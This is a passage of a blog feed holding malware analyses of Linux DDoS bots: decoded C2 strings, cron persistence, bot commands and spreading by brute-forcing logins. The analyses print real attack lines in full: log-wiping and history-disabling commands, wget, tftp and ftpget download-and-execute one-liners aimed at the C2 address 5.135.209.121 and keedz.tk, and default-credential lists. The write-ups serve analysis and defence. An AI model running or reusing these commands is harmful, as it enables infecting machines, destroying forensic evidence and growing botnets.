&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;1. m4S4nAC/n&amp;amp;ZV - /var/run/gcc
2. m4S4nAC/nA - /var/run/
3. m6_6n3 - /tmp/
4. m [(n3 - /bin/
5. m7A4nQ_/nA - /usr/bin/
6. m.[$n__#4%\\C - /lib/libudev
7. &amp;amp;,Ak&amp;amp;\\Y&amp;amp;-$\x17ZFV|\x06rr\x02v=R\x1b%/2\x14R[^!\\\'lQ),\t - dns-google.org:60000|a-dns-google.com:
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Further execution shows that a Bash script will be downloaded from &lt;code class=&quot;highlighter-rouge&quot;&gt;103.25.9.228&lt;/code&gt; using a HTTP GET request. Last checked on 21/9/08, the IP address is no longer responding to any connection. However, some of the malware post-installation can still be found within the binary itself.&lt;/p&gt;

&lt;p&gt;The post-installation consists of a Bash script named &lt;code class=&quot;highlighter-rouge&quot;&gt;/etc/cron.hourly/gcc4.sh&lt;/code&gt; which contains the following lines.&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c&quot;&gt;#!/bin/sh&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;PATH&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;/bin:/sbin:/usr/bin:/usr/sbin:/usr/local/bin:/usr/local/sbin:/usr/X11R6/bin
&lt;span class=&quot;nb&quot;&gt;cp&lt;/span&gt; /lib/libudev4.so /lib/libudev4.so.6
/lib/libudev4.so.6
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;sed -i \'/\\/etc\\/cron.hourly\\/gcc4.sh/d\' /etc/crontab &amp;amp;&amp;amp; echo \'*/3 * * * * root /etc/cron.hourly/gcc4.sh\' &amp;gt; /etc/crontab
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;</content><author><name></name></author><summary type="html">Upon decompiling, there is a subroutine called as encrypt_code. This subroutine is using XOR to “encrypt” the string with the predefined key. The string can be “decrypt” using a simple Python script found here (https://gist.github.com/moonbingbing/3432989).</summary></entry><entry><title type="html">b08f9dc5784532be5b3f695f37c7781b</title><link href="http://localhost:4000/blog/b08f9dc5784532be5b3f695f37c7781b/" rel="alternate" type="text/html" title="b08f9dc5784532be5b3f695f37c7781b" /><published>2018-09-06T00:00:00+08:00</published><updated>2018-09-06T00:00:00+08:00</updated><id>http://localhost:4000/blog/b08f9dc5784532be5b3f695f37c7781b</id><content type="html" xml:base="http://localhost:4000/blog/b08f9dc5784532be5b3f695f37c7781b/">&lt;p&gt;Initial file dropped:&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;clear ; unset ; rm -rf /var/run/utmp /var/log/wtmp /var/log/lastlog /var/log/messages /var/log/secure /var/log/xferlog /var/log/maillog /root/.bash_history ; unset HISTFILE ; unset HISTSAVE ; unset HISTLOG ; history -n ; unset WATCH ; export HISTFILE=/dev/null ; wget keedz.tk/client ; chmod +x client ; ./client ; rm -rf client ; rm -rf bash_history ; export HISTFILE=/dev/null ; rm -rf botz.sh ; exit
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;The &lt;code class=&quot;highlighter-rouge&quot;&gt;client&lt;/code&gt; is a 64-bit ELF binary. The binary acts as a DoS bot which connect to their CNC (5.135.209.121) on port 23.&lt;/p&gt;

&lt;p&gt;Available commands:&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;GETLOCALIP
SCANNER ON | OFF
HOLD
JUNK
HTTP
COMBO
KILLATTK
FUCKOFF
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Below is the connection to the CNC:&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;Trying 5.135.209.121...
Connected to ip121.ip-5-135-209.eu.
Escape character is '^]'.
!* SCANNER ON
PING
PONG
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;If you try to connect for the 2nd time, this will be output.&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;Trying 5.135.209.121...
Connected to ip121.ip-5-135-209.eu.
Escape character is '^]'.
!* LOLNOGTFO
Connection closed by foreign host.
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;However, the CNC can be connected again after a few seconds.&lt;/p&gt;

&lt;p&gt;The binary spread by bruteforcing the login for a random IP addresses.&lt;/p&gt;

&lt;p&gt;List of usernames:&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root
admin
user
login
guest
support
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;List of passwords:&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root
toor
admin
user
guest
login
changeme
1234
12345
123456
default
password
support
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Once logged in, it will execute the following commands:&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://5.135.209.121/bins.sh; chmod 777 bins.sh; sh bins.sh; tftp 5.135.209.121 -c get tftp1.sh; chmod 777 tftp1.sh; sh tftp1.sh; tftp -r tftp2.sh -g 5.135.209.121; chmod 777 tftp2.sh; sh tftp2.sh; ftpget -v -u anonymous -p anonymous -P 23 5.135.209.121 ftp1.sh ftp1.sh; sh ftp1.sh; rm -rf bins.sh tftp1.sh tftp2.sh ftp1.sh; rm -rf *; exit
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Inside bins.sh, more binary will be fetch&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;-e #!/bin/bash
-e cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://5.135.209.121/ntpd; chmod +x ntpd; ./ntpd; rm -rf ntpd
-e cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://5.135.209.121/sshd; chmod +x sshd; ./sshd; rm -rf sshd
-e cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://5.135.209.121/openssh; chmod +x openssh; ./openssh; rm -rf openssh
-e cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://5.135.209.121/bash; chmod +x bash; ./bash; rm -rf bash
-e cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://5.135.209.121/tftp; chmod +x tftp; ./tftp; rm -rf tftp
-e cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://5.135.209.121/wget; chmod +x wget; ./wget; rm -rf wget
-e cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://5.135.209.121/cron; chmod +x cron; ./cron; rm -rf cron
-e cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://5.135.209.121/ftp; chmod +x ftp; ./ftp; rm -rf ftp
-e cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://5.135.209.121/pftp; chmod +x pftp; ./pftp; rm -rf pftp
-e cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://5.135.209.121/sh; chmod +x sh; ./sh; rm -rf sh
-e cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://5.135.209.121/' '; chmod +x ' '; ./' '; rm -rf ' '
-e cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://5.135.209.121/apache2; chmod +x apache2; ./apache2; rm -rf apache2
-e cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://5.135.209.121/telnetd; chmod +x telnetd; ./telnetd; rm -rf telnetd
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;</content><author><name></name></author><summary type="html">Initial file dropped:</summary></entry></feed>